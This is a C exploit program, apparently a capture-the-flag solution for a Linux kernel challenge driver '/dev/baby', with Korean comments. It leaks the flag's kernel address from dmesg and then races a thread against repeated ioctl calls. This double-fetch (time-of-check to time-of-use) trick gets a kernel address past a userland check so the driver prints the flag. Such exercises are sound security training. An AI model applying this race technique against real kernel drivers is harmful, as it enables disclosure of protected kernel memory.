#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h> // exit()
#include <sys/ioctl.h> // ioctl()
#include <string.h> // strstr()
#include <unistd.h> // read()
#include <pthread.h> // pthread_create()

int end = 0;
unsigned long long flag_addr;

struct input
{
    char *addr;
    size_t len;
};

void change_addr(void *input)
{
    struct input *in = input;
    while(end == 0) // end == 1이면 종료
    {
        in->addr = flag_addr;
    }
}

int main()
{
    int fd, fd2;
    char *flag, *index;
    char buf[0x100]={0};
    int ret;
    struct input in;
    pthread_t thread;

    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);

    fd = open("/dev/baby", O_RDWR);

    // cmd == 0x666: get flag addr
    ioctl(fd, 0x6666);
    system("dmesg | grep flag > /tmp/msg");
    fd2 = open("/tmp/msg", O_RDONLY);
    read(fd2, buf, 0x100-1);
    close(fd2);
    index = strstr(buf, "Your flag is at ");
    if(index)
    {
        index += 0x10; // flag 위치
        flag_addr = strtoull(index, index+0x10, 0x10);
        printf("[+] flag addr: %p\n", flag_addr);
    }else{
        puts("[-] flag addr not found.");
        exit(0);
    }
    
    // cmd == 0x1337: 조건문 통과 위해 len을 33(실제 플래그 길이), addr을 임의의 스택 주소(userland)로 설정
    in.addr = buf;
    in.len = 0x21;

    // 쓰레드 생성. else if 내부로 들어가서 플래그 출력 위해 t.addr을 실제 flag 주소로 변경
    pthread_create(&thread, NULL, &change_addr, &in);
    while(1)
    {
        ret = ioctl(fd, 0x1337, &in);
        if(!ret) 
        {
            end = 1;
            break;
        }
        // else if 조건문 만족 위해 ioctl 호출 전 스택 주소로  바꿔준다.
        in.addr = buf;
    }
    // 쓰레드 종료를 기다린다.
    pthread_join(thread, NULL);
    close(fd);
    // flag 출력
    system("dmesg | grep flag");

    return 0;
}
